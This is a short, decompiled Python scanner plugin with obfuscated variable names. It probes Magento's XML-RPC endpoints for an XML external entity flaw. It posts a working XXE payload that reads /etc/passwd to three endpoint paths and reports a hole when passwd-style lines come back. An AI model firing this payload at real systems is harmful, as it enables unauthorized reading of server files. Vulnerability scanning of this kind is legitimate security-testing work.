# Embedded file name: magento.py
import urlparse
import urllib
import re


def assign(service, arg):
    if service != "www":
        return
    else:
        OO0o = urlparse.urlparse(arg)
        return True, '''%s://%s/''' % (OO0o.scheme, OO0o.netloc)


def audit(arg):
    o0OoOoOO00 = arg
    I11i = "<?xml version=\"1.0\"?>\n <!DOCTYPE foo [  \n  <!ELEMENT methodName ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<methodCall>\n  <methodName>&xxe;</methodName>\n</methodCall>"
    for O0O in ['''server.php''', '''xmlrpc.php''', '''index.php/api/xmlrpc''']:
        Oo = o0OoOoOO00 + O0O
        I1ii11iIi11i, I1IiI, o0OOO, iIiiiI, iIiiiI = curl.curl('''-d "%s" %s''' % (urllib.quote(I11i), Oo))
        debug('''[%03d] %s''', I1ii11iIi11i, Oo)
        if I1ii11iIi11i == 200 and o0OOO and re.search("[\r\n][^\n]+\:[^\n]+\:/[^\n]+/sh[\r\n]+", o0OOO):
            security_hole(o0OoOoOO00)


if __name__ == '__main__':
    from dummy import *

    # KEY---a88b7e002686d3fbc2a187e628d32ec7ddea1fbf47ce00ef6523ce90dba04327---
